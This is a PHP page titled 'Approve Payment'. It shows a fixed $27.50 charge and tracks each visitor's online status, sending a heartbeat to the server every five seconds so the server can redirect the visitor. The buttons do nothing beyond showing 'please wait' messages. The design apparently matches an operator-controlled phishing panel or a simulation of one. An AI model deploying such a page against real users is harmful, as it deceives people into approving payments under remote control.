<?php
session_start();
require_once __DIR__ . '/includes/functions.php';
if (empty($_SESSION['student_token'])) { header('Location: index.php'); exit; }
$student = getStudentByToken($_SESSION['student_token']);
if (!$student) { header('Location: index.php'); exit; }
updateStudentActivity($student['id'], 'approve');
$visitorId = (int)($_SESSION['visitor_id'] ?? 0);
if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, status='approve', last_activity=datetime('now') WHERE id=?")->execute([$visitorId]); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve Payment</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0f2f5;color:#1e293b;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;border-radius:14px;padding:36px;max-width:420px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.06)}
        .icon{font-size:3rem;margin-bottom:16px}
        h1{font-size:1.3rem;margin-bottom:8px}
        p{color:#64748b;font-size:.9rem;margin-bottom:24px;line-height:1.6}
        .amount{font-size:1.8rem;font-weight:700;color:#1e293b;margin-bottom:24px}
        .btn-row{display:flex;gap:12px;justify-content:center}
        .btn{padding:12px 28px;border:none;border-radius:10px;font-size:.95rem;font-weight:600;cursor:pointer;font-family:inherit;transition:background .15s}
        .btn-approve{background:#16a34a;color:#fff}.btn-approve:hover{background:#15803d}
        .btn-decline{background:#f1f5f9;color:#64748b;border:1.5px solid #e2e8f0}.btn-decline:hover{background:#e2e8f0}
        .alert{padding:12px;border-radius:10px;font-size:.88rem;margin-top:16px;font-weight:500}
        .alert-success{background:#f0fdf4;color:#16a34a}
        .alert-warn{background:#fef3c7;color:#b45309}
    </style>
</head>
<body>
<div class="card">
    <div class="icon">&#9989;</div>
    <h1>Approve Payment</h1>
    <p>Please confirm the following payment from your account.</p>
    <div class="amount">$27.50</div>
    <div class="btn-row">
        <button class="btn btn-approve" onclick="approve()">Approve</button>
        <button class="btn btn-decline" onclick="decline()">Decline</button>
    </div>
    <div id="msg"></div>
</div>
<script>
const studentId=<?=(int)$student['id']?>;const visitorId=<?=$visitorId?>;let pageVisible=true;
function approve(){document.getElementById('msg').className='alert alert-success';document.getElementById('msg').textContent='Payment approved! Please wait...';}
function decline(){document.getElementById('msg').className='alert alert-warn';document.getElementById('msg').textContent='Payment declined. Please wait for instructions.';}
function hb(){if(!pageVisible||document.hidden)return;fetch('api/heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({student_id:studentId})}).then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect}).catch(()=>{});if(visitorId)fetch('api/visitor-heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitor_id:visitorId,status:'approve'})}).catch(()=>{});}
document.addEventListener('visibilitychange',()=>{if(document.hidden){pageVisible=false;navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));if(visitorId)navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));clearInterval(t);t=null}else{pageVisible=true;hb();if(!t)t=setInterval(hb,5000)}});
function off(){navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));if(visitorId)navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));}
hb();let t=setInterval(hb,5000);window.addEventListener('pagehide',off);window.addEventListener('beforeunload',off);
</script>
</body>
</html>
